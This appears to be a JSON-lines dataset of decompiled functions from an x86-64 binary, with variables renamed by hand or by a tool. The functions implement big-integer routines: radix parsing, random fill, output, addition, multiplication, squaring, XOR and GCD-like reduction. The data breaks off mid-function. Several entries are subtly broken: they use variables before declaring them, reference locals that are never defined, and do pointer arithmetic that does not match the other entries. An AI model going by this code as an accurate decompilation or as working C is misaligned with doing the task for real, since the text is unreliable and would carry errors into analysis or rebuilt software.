{"Function Name": "FUN_00409050", "Address": "00409050", "Source Code": "undefined8 FUN_00409050(int *intArray, int count, FILE *filePointer)\n{\n    \n    long longValue = *(long *)(intArray + 4);\n    \n    int secondElement = intArray[1];\n    \n    intArray[2] = 0;\n    \n    *intArray = 0;\n    \n    if (secondElement > 0) {\n        \n        for (long index = 0; index < secondElement; index++) {\n            \n            *(undefined8 *)(longValue + index * 8) = 0;\n        }\n    }\n    \n    secondElement = fgetc(filePointer);\n    \n    bool isNegative = (secondElement == 0x2d);\n    \n    if (isNegative) {\n        secondElement = fgetc(filePointer);\n    }\n    \n    if (count < 1) {\n        \n        if (count == 0) {\n            \n            if ((intArray[2] == 1) || (1 < *intArray) || (FUN_00405a00(intArray, 0) != 0)) {\n                \n                intArray[2] = (uint)isNegative;\n                return 0; \n            }\n            return 0; \n        }\n    } else {\n        \n        if ((char)*PTR_s_0123456789ABCDEFGHIJKLMNOPQRSTUV_00649590 == secondElement) {\n            int charCount = 0; \n            char *charPointer = PTR_s_0123456789ABCDEFGHIJKLMNOPQRSTUV_00649590;\n            \n            do {\n                charPointer++; \n                charCount++; \n                \n                if (charCount == count) {\n                    \n                    if (((intArray[2] == 1) || (1 < *intArray) || (FUN_00405a00(intArray, 0) != 0))) {\n                        \n                        intArray[2] = (uint)isNegative;\n                        return 0; \n                    }\n                    return 0; \n                }\n            } while (*charPointer != secondElement); \n        }\n    }\n    \n    undefined8 result = FUN_004078b0(intArray, (long)count, intArray);\n    \n    if (result != 0) {\n        return result; \n    }\n    \n    result = FUN_00408dd0(intArray, (long)count, intArray);\n    \n    if (result != 0) {\n        return result; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00409170", "Address": "00409170", "Source Code": "undefined8 FUN_00409170(undefined4 *input_array, int count)\n{\n    long counter = 0; \n    int size = input_array[1]; \n    input_array[2] = 0; \n    *input_array = 0; \n    long base_address = *(long *)(input_array + 4); \n    if (size > 0) { \n        do {\n            *(undefined8 *)(base_address + counter * 8) = 0; \n            counter++; \n        } while (counter < size); \n    }\n    \n    if (count > 0) { \n        ulong random_value; \n        do {\n            uint random_number = rand(); \n            random_value = (long)(int)((random_number ^ (int)random_number >> 0x1f) - ((int)random_number >> 0x1f)) & 0xfffffffffffffff; \n        } while (random_value == 0); \n        \n        undefined8 result = FUN_00408dd0(input_array, random_value, input_array); \n        while (true) { \n            if (size != 0) { \n                return result; \n            }\n            count--; \n            if (count == 0) break; \n            result = FUN_00407140(input_array, 1); \n            if ((int)result != 0) { \n                return result; \n            }\n            uint random_number = rand(); \n            result = FUN_00408dd0(input_array, (long)(int)((random_number ^ (int)random_number >> 0x1f) - ((int)random_number >> 0x1f)), input_array); \n            size = (int)result; \n        }\n        return 0; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00409240", "Address": "00409240", "Source Code": "ulong FUN_00409240(uint *array, char *charPointer, int length)\n{\n    uint secondElement; \n    ulong returnValue; \n    char currentChar; \n    uint isNegative = 0; \n    secondElement = array[1]; \n    array[2] = 0; \n    *array = 0; \n    if (0 < (int)secondElement) { \n        for (long index = 0; index < (long)secondElement; index++) { \n            *(undefined8 *)(array + 4 + index) = 0; \n        }\n    }\n    if (length - 2U < 0x3f) { \n        currentChar = *charPointer; \n        if (currentChar == '-') { \n            charPointer++; \n            isNegative = 1; \n        }\n        if (*charPointer != '\\0') { \n            do {\n                if (length < 0x25) { \n                    currentChar = __ctype_toupper_loc()[currentChar]; \n                }\n                uint charIndex = 0; \n                while (currentChar != PTR_s_0123456789ABCDEFGHIJKLMNOPQRSTUV_00649590[charIndex]) { \n                    charIndex++; \n                    if (charIndex == 0x40) goto LAB_00409350; \n                }\n                if (length <= (int)charIndex) break; \n                returnValue = FUN_004078b0(array, (long)length, array); \n                if ((int)returnValue != 0) { \n                    return returnValue; \n                }\n                returnValue = FUN_00408dd0(array, charIndex, array); \n                if ((int)returnValue != 0) { \n                    return returnValue; \n                }\n                charPointer++; \n                currentChar = *charPointer; \n            } while (currentChar != '\\0'); \n        }\n    LAB_00409350: \n        if (*array == 0) { \n            return (ulong)*array; \n        }\n        array[2] = isNegative; \n    } else {\n        returnValue = 0xfffffffd; \n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_004095c0", "Address": "004095c0", "Source Code": "ulong FUN_004095c0(undefined8 input_param, ulong size_param, FILE *file_pointer)\n{\n    uint return_value; \n    ulong allocation_size; \n    void *memory_pointer; \n    long loop_counter; \n    int allocated_size; \n    \n    allocation_size = FUN_004084a0(input_param, size_param, &allocated_size);\n    \n    \n    if ((int)allocation_size == 0) {\n        \n        memory_pointer = malloc((long)allocated_size);\n        \n        \n        if (memory_pointer == (void *)0x0) {\n            return 0xfffffffe; \n        } else {\n            \n            return_value = FUN_00409470(input_param, memory_pointer, size_param & 0xffffffff);\n            \n            \n            if (return_value == 0) {\n                \n                for (loop_counter = 0; loop_counter < allocated_size; loop_counter++) {\n                    \n                    if (fputc((int)*(char *)((long)memory_pointer + loop_counter), file_pointer) == -1) {\n                        free(memory_pointer); \n                        return 0xfffffffd; \n                    }\n                }\n                free(memory_pointer); \n                return 0; \n            }\n            free(memory_pointer); \n            return (ulong)return_value; \n        }\n    }\n    return allocation_size; \n}"}
{"Function Name": "FUN_00409710", "Address": "00409710", "Source Code": "undefined8 FUN_00409710(long inputParam1, long inputParam2, ulong *outputParam)\n{\n    \n    int resultCode = FUN_004096a0();\n    \n    \n    undefined8 returnValue = 0xfffffffd;\n    \n    if ((ulong)(long)(resultCode + 1) <= *outputParam) {\n        \n        *outputParam = (long)(resultCode + 1);\n        \n        \n        returnValue = FUN_00409390(inputParam1, inputParam2 + 1);\n        \n        \n        if ((int)returnValue == 0) {\n            \n            *(bool *)inputParam2 = *(int *)(inputParam1 + 8) != 0;\n        }\n    }\n    \n    \n    return returnValue;\n}"}
{"Function Name": "FUN_00409760", "Address": "00409760", "Source Code": "undefined8 FUN_00409760(int *param_1, int *param_2, undefined8 *param_3)\n{\n    ulong *bitwisePointer; \n    int valueFromParam; \n    long addressOffset; \n    long loopCounter; \n    int operationValue; \n    undefined4 fourByteValue; \n    long addressCalculation; \n    \n    if (*param_2 < *param_1) {\n        \n        if (FUN_00406f80(&operationValue, param_1) != 0) {\n            return thirdValueFromParam; \n        }\n        valueFromParam = *param_2; \n        param_1 = param_2; \n    } else {\n        \n        if (FUN_00406f80(&operationValue) != 0) {\n            return thirdValueFromParam; \n        }\n        valueFromParam = *param_1; \n    }\n    \n    if (0 < valueFromParam) {\n        addressOffset = *(long *)(param_1 + 4); \n        \n        for (loopCounter = 0; loopCounter < valueFromParam; loopCounter++) {\n            bitwisePointer = (ulong *)(addressCalculation + loopCounter * 8); \n            *bitwisePointer ^= *(ulong *)(addressOffset + loopCounter * 8); \n        }\n    }\n    \n    if (operationValue < 1) {\n        \n        fourByteValue = (operationValue == 0) ? 0 : fourByteValue;\n    } else {\n        \n        addressOffset = *(long *)(addressCalculation + -8 + (long)operationValue * 8);\n        long *decrementPointer = (long *)(addressCalculation + -0x10 + (long)operationValue * 8); \n        \n        while (addressOffset == 0) {\n            operationValue--; \n            if (operationValue == 0) {\n                operationValue = 0; \n                fourByteValue = 0; \n                break; \n            }\n            addressOffset = *decrementPointer--; \n        }\n    }\n    \n    undefined8 combinedValue = CONCAT44(operationValue, fourByteValue);\n    operationValue = *(int *)param_3; \n    fourByteValue = *(undefined4 *)((long)param_3 + 4); \n    undefined4 fourByteValueFromParam = *(undefined4 *)(param_3 + 1); \n    undefined8 thirdValueFromParam = param_3[2]; \n    *param_3 = combinedValue; \n    param_3[1] = CONCAT44(uStack_3c, fourByteValue); \n    param_3[2] = addressCalculation; \n    FUN_004064f0(&operationValue); \n    return 0; \n}"}
{"Function Name": "FUN_00409900", "Address": "00409900", "Source Code": "undefined8 FUN_00409900(int *input_array_1, int *input_array_2, int *output_array)\n{\n    \n    int value_from_output_array = *output_array; \n    int value_from_input_array_1 = *input_array_1; \n    int value_from_input_array_2 = *input_array_2; \n    int count = value_from_input_array_1; \n    int *pointer_to_selected_array = input_array_2; \n    \n    if (value_from_input_array_2 < value_from_input_array_1) {\n        pointer_to_selected_array = input_array_1; \n        count = value_from_input_array_2; \n        value_from_input_array_2 = value_from_input_array_1; \n    }\n    value_from_input_array_1 = value_from_input_array_2 + 1; \n    \n    if (((output_array[1] <= value_from_input_array_2) && (output_array[1] < value_from_input_array_1)) &&\n        (function_return_value = FUN_00405a20(output_array), (int)function_return_value != 0)) {\n        return function_return_value; \n    }\n    long long_value_from_input_array_1 = *(long *)(input_array_1 + 4); \n    *output_array = value_from_input_array_1; \n    long long_value_from_input_array_2 = *(long *)(input_array_2 + 4); \n    ulong *pointer_to_ulong = *(ulong **)(output_array + 4); \n    ulong accumulated_value = 0; \n    \n    if (count >= 1) {\n        for (long loop_counter = 0; loop_counter < count; loop_counter++) {\n            \n            accumulated_value += *(long *)(long_value_from_input_array_2 + loop_counter * 8) + *(long *)(long_value_from_input_array_1 + loop_counter * 8);\n            pointer_to_ulong[loop_counter] = accumulated_value & 0xfffffffffffffff; \n            accumulated_value >>= 0x3c; \n        }\n        long_value_from_input_array_1 = (long)count; \n    } else {\n        long_value_from_input_array_1 = 0; \n    }\n    \n    if ((count != value_from_input_array_2) && ((int)long_value_from_input_array_1 < value_from_input_array_2)) {\n        long_value_from_input_array_2 = *(long *)(pointer_to_selected_array + 4); \n        \n        for (long loop_counter = 0; loop_counter < (ulong)(uint)((value_from_input_array_2 + -1) - (int)long_value_from_input_array_1) * 8 + 8; loop_counter += 8) {\n            accumulated_value += *(long *)(long_value_from_input_array_2 + long_value_from_input_array_1 * 8 + loop_counter); \n            pointer_to_ulong[long_value_from_input_array_1 + loop_counter / 8] = accumulated_value & 0xfffffffffffffff; \n            accumulated_value >>= 0x3c; \n        }\n    }\n    ulong *next_position_pointer = pointer_to_ulong + (ulong)(count - 1) + 1; \n    *next_position_pointer = accumulated_value; \n    \n    if (value_from_input_array_1 < value_from_output_array) {\n        for (ulong *zero_initialization_pointer = next_position_pointer + 1; zero_initialization_pointer != pointer_to_ulong + (ulong)(uint)((value_from_output_array + -1) - value_from_input_array_1) + 2; zero_initialization_pointer++) {\n            *zero_initialization_pointer = 0; \n        }\n    }\n    \n    if (value_from_input_array_1 < 1) {\n        if (value_from_input_array_1 == 0) {\n            output_array[2] = 0; \n        }\n    } else {\n        ulong *last_valid_position_pointer = pointer_to_ulong + (long)value_from_input_array_1 - 2; \n        \n        if (pointer_to_ulong[(long)value_from_input_array_1 - 1] == 0) {\n            do {\n                value_from_input_array_1--; \n                if (value_from_input_array_1 == 0) {\n                    *output_array = 0; \n                    output_array[2] = 0; \n                    return 0; \n                }\n                last_valid_position_pointer--; \n            } while (*last_valid_position_pointer == 0); \n            *output_array = value_from_input_array_1; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00409ac0", "Address": "00409ac0", "Source Code": "undefined8 FUN_00409ac0(int *inputParam1, int *inputParam2, undefined8 *outputParam, int inputParam4) {\n    int indexVar1, indexVar10, indexVar17; \n    long longVar2, longVar3, longVar16; \n    ulong ulongVar4, ulongVar12; \n    undefined8 ulongVar11, localVar58, localVar50; \n    ulong *ulongPtr13, *ulongPtr15; \n    \n    if (inputParam4 < 0x200) {\n        indexVar10 = *inputParam2; \n        \n        if (*inputParam1 <= indexVar10) {\n            indexVar10 = *inputParam1;\n        }\n        \n        if (indexVar10 < 0x100) {\n            return FUN_00405cb0();\n        }\n    }\n    \n    \n    ulongVar11 = FUN_00406ce0(&localVar58, inputParam4);\n    \n    if ((int)ulongVar11 == 0) {\n        indexVar10 = *inputParam1; \n        \n        if (0 < indexVar10) {\n            indexVar1 = *inputParam2; \n            longVar2 = *(long *)(inputParam2 + 4); \n            longVar3 = *(long *)(inputParam1 + 4); \n            longVar16 = 0; \n            ulongPtr13 = (ulong *)local_48; \n            do {\n                int indexVar17 = inputParam4 - (int)longVar16; \n                \n                if (indexVar1 < indexVar17) {\n                    indexVar17 = indexVar1;\n                }\n                ulongVar4 = *(ulong *)(longVar3 + longVar16 * 8); \n                \n                if (indexVar17 < 1) {\n                    ulongVar12 = 0;\n                } else {\n                    long longVar14 = 0; \n                    ulongVar12 = 0; \n                    do {\n                        undefined arrayVar9[16], arrayVar7[16], arrayVar8[16]; \n                        arrayVar9[8] = CARRY8(ulongPtr13[longVar14], ulongVar12); \n                        arrayVar9._0_8_ = ulongPtr13[longVar14] + ulongVar12; \n                        arrayVar9._9_7_ = 0; \n                        arrayVar7._0_8_ = ulongVar4; \n                        arrayVar8._0_8_ = *(ulong *)(longVar2 + longVar14 * 8); \n                        \n                        arrayVar9 = arrayVar7 * arrayVar8 + arrayVar9;\n                        ulongVar12 = arrayVar9._0_8_; \n                        ulongPtr13[longVar14] = ulongVar12 & 0xfffffffffffffff; \n                        longVar14++; \n                        \n                        ulongVar12 = ulongVar12 >> 0x3c | arrayVar9._8_8_ << 4;\n                    } while ((int)longVar14 < indexVar17); \n                }\n                \n                if (indexVar17 + (int)longVar16 < inputParam4) {\n                    ulongPtr13[indexVar17] = ulongVar12;\n                }\n                longVar16++; \n                ulongPtr13++; \n            } while ((int)longVar16 < indexVar10); \n        }\n        \n        \n        if (inputParam4 < 1) {\n            \n            if (inputParam4 == 0) {\n                localVar50._0_4_ = 0;\n                inputParam4 = 0;\n            }\n        } else if (local_48[inputParam4 - 1] == 0) { \n            ulongPtr13 = local_48 + inputParam4 - 2; \n            do {\n                inputParam4--; \n                \n                if (inputParam4 == 0) {\n                    localVar50._0_4_ = 0;\n                    break;\n                }\n                ulongVar4 = *ulongPtr13--; \n            } while (ulongVar4 == 0); \n        }\n        \n        ulongVar11 = *outputParam; \n        *(int *)outputParam = inputParam4; \n        *(undefined4 *)((long)outputParam + 4) = localVar58._4_4_; \n        outputParam[1] = (undefined4)localVar50; \n        outputParam[2] = local_48; \n        localVar58 = ulongVar11; \n        FUN_004064f0(&localVar58); \n        ulongVar11 = 0; \n    }\n    return ulongVar11; \n}"}
{"Function Name": "FUN_00409cd0", "Address": "00409cd0", "Source Code": "undefined8 FUN_00409cd0(int *param_1, int *param_2, undefined8 *param_3, int param_4)\n{\n    uint intermediateResult; \n    int valueParam2; \n    long valueFromParam1; \n    long valueFromParam2; \n    ulong unsignedLongValue; \n    undefined8 returnValue; \n    int valueParam1; \n    int calculationResult; \n    undefined8 temporaryStorage1; \n    undefined8 temporaryStorage2; \n    long temporaryStorage3; \n    valueParam1 = *param_1; \n    valueParam2 = *param_2; \n    if (valueParam1 + valueParam2 < 0x1ff) { \n        if (valueParam2 <= valueParam1 && valueParam2 < 0x100) { \n            return FUN_00405ef0(param_1, param_2, param_3, param_4); \n        }\n    }\n    returnValue = FUN_00406ce0(&temporaryStorage1, valueParam1 + valueParam2 + 1); \n    if ((int)returnValue == 0) { \n        calculationResult = valueParam1 + 1 + valueParam2; \n        if (0 < valueParam1) { \n            valueFromParam1 = *(long *)(param_1 + 4); \n            valueFromParam2 = *(long *)(param_2 + 4); \n            intermediateResult = (valueParam2 - 1) - param_4; \n            valueParam1 = param_4 - valueParam1; \n            ulong *calculationPointer = (ulong *)(temporaryStorage3 + (long)param_4 * 8); \n            long loopControl = 0; \n            do {\n                unsignedLongValue = *(ulong *)(valueFromParam1 + loopControl); \n                ulong accumulatedValue = 0; \n                ulong *resultPointer = calculationPointer; \n                ulong *calculationPointer2 = (ulong *)((long)param_4 * 8 + valueFromParam2 - loopControl); \n                do {\n                    undefined intermediateArray1[16] = {0}, intermediateArray2[16] = {0}, intermediateArray3[16] = {0}, intermediateArray4[16] = {0}; \n                    intermediateArray1._0_8_ = unsignedLongValue; \n                    intermediateArray2._0_8_ = *calculationPointer2; \n                    intermediateArray3._0_8_ = accumulatedValue; \n                    intermediateArray4._0_8_ = *resultPointer; \n                    intermediateArray4 = intermediateArray1 * intermediateArray2 + intermediateArray3 + intermediateArray4; \n                    accumulatedValue = intermediateArray4._0_8_; \n                    resultPointer++; \n                    *resultPointer = accumulatedValue & 0xfffffffffffffff; \n                    accumulatedValue = accumulatedValue >> 0x3c | intermediateArray4._8_8_ << 4; \n                    calculationPointer2++; \n                } while (resultPointer != calculationPointer + (ulong)intermediateResult + 1); \n                resultPointer = calculationPointer + (ulong)intermediateResult + 1; \n                loopControl += 8; \n                param_4--; \n                intermediateResult++; \n                *resultPointer = accumulatedValue; \n            } while (param_4 != valueParam1); \n        }\n        if (calculationResult < 1) { \n            if (calculationResult == 0) { \n                temporaryStorage2._0_4_ = 0; \n                calculationResult = 0; \n            }\n        } else if (*(long *)(temporaryStorage3 + -8 + (long)calculationResult * 8) == 0) { \n            long *valuePointer = (long *)(temporaryStorage3 + -0x10 + (long)calculationResult * 8); \n            do {\n                calculationResult--; \n                if (calculationResult == 0) { \n                    temporaryStorage2._0_4_ = 0; \n                    break; \n                }\n                valueFromParam1 = *valuePointer; \n                valuePointer--; \n            } while (valueFromParam1 == 0); \n        }\n        returnValue = *param_3; \n        *(int *)((long)param_3 + 4) = temporaryStorage1._4_4_; \n        *(int *)param_3 = calculationResult; \n        param_3[1] = temporaryStorage2; \n        param_3[2] = temporaryStorage3; \n        FUN_004064f0(&temporaryStorage1); \n        returnValue = 0; \n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_0040a340", "Address": "0040a340", "Source Code": "undefined8 FUN_0040a340(int *param_1,int *param_2,long param_3)\n{\nulong *puVar1;\nundefined8 *puVar2;\nint iVar3;\nundefined8 *puVar4;\nulong uVar5;\nundefined auVar6 [16];\nundefined auVar7 [16];\nundefined auVar8 [16];\nint iVar9;\nint iVar10;\nlong lVar11;\nulong *puVar12;\nulong uVar13;\nundefined8 *puVar14;\nlong *plVar15;\nundefined8 uVar16;\nint iVar17;\nulong uVar18;\nundefined (*pauVar19) [16];\nlong lVar20;\nundefined (*pauVar21) [16];\nundefined (*pauVar22) [16];\nundefined (*local_2058) [16];\nint local_2040;\nulong local_2038 [2];\nulong local_2028 [1023];\niVar10 = *param_2;\niVar3 = *param_1;\niVar17 = iVar3;\nif (iVar10 < param_1[1]) {\nlocal_2040 = iVar10 + 1;\n}\nelse {\nlocal_2040 = iVar10 + 1;\nif (param_1[1] < local_2040) {\nuVar16 = FUN_00405a20(param_1,local_2040);\nif ((int)uVar16 != 0) {\nreturn uVar16;\n}\niVar10 = *param_2;\nlocal_2040 = iVar10 + 1;\niVar17 = *param_1;\n}\n}\npuVar4 = *(undefined8 **)(param_1 + 4);\nif (iVar17 < 1) {\npuVar12 = local_2038;\niVar17 = 0;\n}\nelse {\nlVar11 = 0;\nlVar20 = (ulong)(iVar17 - 1) + 1;\ndo {\nuVar16 = *(undefined8 *)((long)puVar4 + lVar11);\n*(undefined8 *)((long)local_2028 + lVar11 * 2 + -8) = 0;\n*(undefined8 *)((long)local_2038 + lVar11 * 2) = uVar16;\nlVar11 = lVar11 + 8;\n} while (lVar11 != lVar20 * 8);\npuVar12 = local_2038 + lVar20 * 2;\n}\nlocal_2058 = (undefined (*) [16])local_2038;\niVar9 = iVar10 * 2;\nif (iVar17 <= iVar9) {\npuVar1 = puVar12 + (ulong)(uint)(iVar9 - iVar17) * 2 + 2;\ndo {\n*puVar12 = 0;\npuVar12[1] = 0;\npuVar12 = puVar12 + 2;\n} while (puVar12 != puVar1);\n}\nif (iVar10 < 1) {\nlVar11 = 0x10;\niVar17 = 1;\npauVar19 = local_2058;\n}\nelse {\nlVar11 = *(long *)(param_2 + 4);\nuVar18 = local_2038[0];\npauVar19 = local_2058;\npauVar21 = (undefined (*) [16])local_2028;\nwhile( true ) {\nlVar20 = 0;\npauVar22 = pauVar19;\nwhile( true ) {\nauVar8._8_8_ = local_2038[1];\nauVar8._0_8_ = uVar18;\nauVar6._8_8_ = 0;\nauVar6._0_8_ = (local_2038[0] & 0xfffffffffffffff) * param_3 & 0xfffffffffffffff;\nauVar7._8_8_ = 0;\nauVar7._0_8_ = *(ulong *)(lVar11 + lVar20 * 8);\nlVar20 = lVar20 + 1;\n*pauVar22 = auVar6 * auVar7 + auVar8;\nif (iVar10 <= (int)lVar20) break;\nuVar18 = *(ulong *)pauVar22[1];\nlocal_2038[1] = *(ulong *)(pauVar22[1] + 8);\npauVar22 = pauVar22 + 1;\n}\nuVar18 = *(ulong *)(*pauVar19 + 8);\nuVar13 = *(ulong *)*pauVar19 >> 0x3c | uVar18 << 4;\nuVar5 = *(ulong *)pauVar19[1];\nlocal_2038[0] = uVar13 + *(long *)pauVar19[1];\nlVar20 = *(long *)(pauVar19[1] + 8);\n*(ulong *)pauVar19[1] = local_2038[0];\n*(ulong *)(pauVar19[1] + 8) = (uVar18 >> 0x3c) + lVar20 + (ulong)CARRY8(uVar13,uVar5);\nif (pauVar21 == (undefined (*) [16])local_2028 + (iVar10 - 1)) break;\nuVar18 = *(ulong *)*pauVar21;\nlocal_2038[1] = *(ulong *)(*pauVar21 + 8);\npauVar19 = pauVar21;\npauVar21 = pauVar21 + 1;\n}\nlVar11 = (long)iVar10 * 0x10 + 0x10;\npauVar19 = local_2058 + iVar10;\niVar17 = local_2040;\n}\npuVar12 = (ulong *)(*local_2058 + lVar11);\nif (iVar17 <= iVar9 + 1) {\ndo {\nuVar5 = *(ulong *)(*pauVar19 + 8);\nuVar13 = *(ulong *)*pauVar19 >> 0x3c | uVar5 << 4;\nuVar18 = *puVar12;\n*puVar12 = *puVar12 + uVar13;\npuVar12[1] = puVar12[1] + (uVar5 >> 0x3c) + (ulong)CARRY8(uVar18,uVar13);\npuVar12 = puVar12 + 2;\npauVar19 = pauVar19 + 1;\n} while (puVar12 !=\n(ulong *)((long)local_2028 + (ulong)(uint)((iVar9 + 1) - iVar17) * 0x10 + lVar11));\n}\nlVar11 = 0;\nif (iVar10 < 0) {\niVar10 = 0;\npuVar14 = puVar4;\n}\nelse {\ndo {\n*(ulong *)((long)puVar4 + lVar11) =\n*(ulong *)(local_2058[iVar10] + lVar11 * 2) & 0xfffffffffffffff;\nlVar11 = lVar11 + 8;\n} while (lVar11 != (long)iVar10 * 8 + 8);\npuVar14 = (undefined8 *)(lVar11 + (long)puVar4);\niVar10 = local_2040;\n}\nif (iVar10 < iVar3) {\npuVar2 = puVar14 + (ulong)(uint)((iVar3 + -1) - iVar10) + 1;\ndo {\n*puVar14 = 0;\npuVar14 = puVar14 + 1;\n} while (puVar14 != puVar2);\n}\n*param_1 = local_2040;\nif (local_2040 < 1) {\nif (local_2040 == 0) {\nLAB_0040a5f7:\nparam_1[2] = 0;\n}\n}\nelse {\nplVar15 = puVar4 + (long)local_2040 + -2;\nif (puVar4[(long)local_2040 + -1] == 0) {\ndo {\nlocal_2040 = local_2040 + -1;\nif (local_2040 == 0) {\n*param_1 = 0;\ngoto LAB_0040a5f7;\n}\nlVar11 = *plVar15;\nplVar15 = plVar15 + -1;\n} while (lVar11 == 0);\n*param_1 = local_2040;\n}\n}\niVar10 = FUN_004065f0(param_1,param_2);\nif (iVar10 == -1) {\nreturn 0;\n}\nuVar16 = FUN_0040a1c0(param_1,param_2,param_1);\nreturn uVar16;\n}\nLocal Variable: local_2020 : undefined8\nLocal Variable: local_2028 : undefined8\nLocal Variable: local_2030 : undefined8\nLocal Variable: local_2038 : undefined8\nLocal Variable: local_203c : undefined4\nLocal Variable: local_2040 : undefined4\nLocal Variable: local_2048 : undefined8\nLocal Variable: local_204c : undefined4\nLocal Variable: local_2050 : undefined4\nLocal Variable: local_2058 : undefined8\nLocal Variable: local_2060 : undefined8"}
{"Function Name": "FUN_0040a6e0", "Address": "0040a6e0", "Source Code": "void FUN_0040a6e0(long address1,long address2,long address3)\n{\n    \n    int value1 = *(int *)(address1 + 8);\n    \n    \n    int value2 = *(int *)(address2 + 8);\n    \n    \n    if (value1 == value2) {\n        \n        *(int *)(address3 + 8) = value1;\n        \n        \n        FUN_00409900();\n        return; \n    }\n    \n    \n    if (FUN_004065f0() != -1) {\n        \n        *(int *)(address3 + 8) = value1;\n        \n        \n        FUN_0040a1c0(address1,address2,address3);\n        return; \n    }\n    \n    \n    *(int *)(address3 + 8) = value2;\n    \n    \n    FUN_0040a1c0(address2,address1,address3);\n}"}
{"Function Name": "FUN_0040a760", "Address": "0040a760", "Source Code": "undefined8 FUN_0040a760(int *param_1, int *param_2, ulong param_3) {\n    int valueFromParam2 = *param_2; \n    ulong *ulongArrayPointer = *(ulong **)(param_1 + 4); \n    undefined intermediateCalc1[16]; \n    undefined intermediateCalc2[16]; \n    undefined intermediateCalc3[16]; \n    ulong carryValue; \n    long loopCounter; \n    \n    if ((valueFromParam2 * 2 <= param_1[1]) || (FUN_00405a20() == 0)) {\n        if (valueFromParam2 < 1) { \n            carryValue = 0; \n        } else {\n            loopCounter = 0; \n            carryValue = 0; \n            do {\n                \n                intermediateCalc3[8] = CARRY8(ulongArrayPointer[loopCounter], carryValue); \n                intermediateCalc3._0_8_ = ulongArrayPointer[loopCounter] + carryValue; \n                intermediateCalc3._9_7_ = 0; \n                intermediateCalc1._8_8_ = 0; \n                intermediateCalc1._0_8_ = param_3; \n                intermediateCalc2._8_8_ = 0; \n                intermediateCalc2._0_8_ = ulongArrayPointer[valueFromParam2 + loopCounter]; \n                intermediateCalc3 = intermediateCalc1 * intermediateCalc2 + intermediateCalc3; \n                carryValue = intermediateCalc3._0_8_; \n                ulongArrayPointer[loopCounter] = carryValue & 0xfffffffffffffff; \n                loopCounter++; \n                carryValue = carryValue >> 0x3c | intermediateCalc3._8_8_ << 4; \n            } while (loopCounter < valueFromParam2); \n        }\n        ulong *nextPositionPointer = ulongArrayPointer + valueFromParam2; \n        *nextPositionPointer = carryValue; \n        int firstElementValue = *param_1; \n        ulong *nextAfterCarryPointer = nextPositionPointer + 1; \n        \n        if (valueFromParam2 + 1 < firstElementValue) {\n            do {\n                *nextAfterCarryPointer++ = 0; \n            } while (nextAfterCarryPointer != nextPositionPointer + (ulong)(uint)((firstElementValue - 2) - valueFromParam2) + 2); \n        }\n        \n        if (firstElementValue >= 1) {\n            nextPositionPointer = ulongArrayPointer + firstElementValue - 2; \n            if (ulongArrayPointer[firstElementValue - 1] == 0) { \n                do {\n                    firstElementValue--; \n                    if (firstElementValue == 0) { \n                        *param_1 = 0; \n                        param_1[2] = 0; \n                        return 0; \n                    }\n                } while (*nextPositionPointer-- == 0); \n                *param_1 = firstElementValue; \n            }\n        } else {\n            param_1[2] = 0; \n        }\n    }\n    \n    if (FUN_004065f0(param_1, param_2) == -1) {\n        return 0; \n    }\n    return FUN_0040a1c0(param_1, param_2, param_1); \n}"}
{"Function Name": "FUN_0040a950", "Address": "0040a950", "Source Code": "ulong FUN_0040a950(int *firstParam, int *secondParam, int *thirdParam)\n{\n    uint tempUnsignedInt; \n    ulong returnValue; \n    int intermediateResult1; \n    int intermediateResult2; \n    int minIntermediateResult; \n    undefined8 dataForProcessing; \n    ulong additionalData; \n    int anotherInteger; \n    undefined4 tempStorage; \n    undefined4 additionalData2; \n    \n    if (*firstParam == 0) {\n        \n        if (secondParam == thirdParam) goto LAB_0040a97c;\n        \n        returnValue = FUN_00406750(secondParam, thirdParam);\n        intermediateResult2 = (int)returnValue; \n    }\n    else {\n        \n        if (*secondParam != 0) {\n            \n            returnValue = FUN_00406f80(&dataForProcessing, firstParam);\n            \n            if ((int)returnValue != 0) {\n                return returnValue;\n            }\n            \n            tempUnsignedInt = FUN_00406f80(&anotherInteger, secondParam);\n            returnValue = (ulong)tempUnsignedInt; \n            \n            if (tempUnsignedInt != 0) goto LAB_0040a9da;\n            additionalData2 = 0; \n            additionalData = additionalData & 0xffffffff00000000; \n            \n            intermediateResult1 = FUN_004066c0(&dataForProcessing);\n            \n            intermediateResult2 = FUN_004066c0(&anotherInteger);\n            minIntermediateResult = intermediateResult1; \n            \n            if (intermediateResult2 <= intermediateResult1) {\n                minIntermediateResult = intermediateResult2; \n            }\n            \n            if (minIntermediateResult < 1) {\n            LAB_0040aa2b:\n                \n                if (intermediateResult1 != minIntermediateResult) {\n                    tempUnsignedInt = FUN_00407f00(&dataForProcessing, intermediateResult1 - minIntermediateResult, &dataForProcessing, 0);\n                    returnValue = (ulong)tempUnsignedInt; \n                    \n                    if (tempUnsignedInt != 0) goto LAB_0040ab20;\n                }\n                \n                if (intermediateResult2 == minIntermediateResult) goto LAB_0040aaa3;\n                intermediateResult2 = intermediateResult2 - minIntermediateResult; \n                while (true) {\n                    \n                    tempUnsignedInt = FUN_00407f00(&anotherInteger, intermediateResult2, &anotherInteger, 0);\n                    returnValue = (ulong)tempUnsignedInt; \n                    \n                    if (tempUnsignedInt != 0) break;\n                LAB_0040aaa3:\n                    \n                    if (anotherInteger == 0) {\n                        tempUnsignedInt = FUN_004074e0(&dataForProcessing, minIntermediateResult, thirdParam);\n                        returnValue = (ulong)tempUnsignedInt; \n                        \n                        if (tempUnsignedInt == 0) {\n                            thirdParam[2] = 0;\n                        }\n                        break; \n                    }\n                    \n                    intermediateResult2 = FUN_004065f0(&dataForProcessing, &anotherInteger);\n                    \n                    if (intermediateResult2 == 1) {\n                        anotherInteger = (int)dataForProcessing; \n                        tempStorage = dataForProcessing._4_4_; \n                        dataForProcessing = CONCAT44(tempStorage, anotherInteger); \n                        additionalData2 = (undefined4)additionalData; \n                        additionalData = CONCAT44(uStack_3c, additionalData2); \n                    }\n                    \n                    tempUnsignedInt = FUN_0040a1c0(&anotherInteger, &dataForProcessing);\n                    returnValue = (ulong)tempUnsignedInt; \n                    \n                    if (tempUnsignedInt != 0) break;\n                    \n                    intermediateResult2 = FUN_004066c0(&anotherInteger);\n                }\n            }\n            else {\n                \n                tempUnsignedInt = FUN_00407f00(&dataForProcessing, minIntermediateResult, &dataForProcessing, 0);\n                returnValue = (ulong)tempUnsignedInt; \n                \n                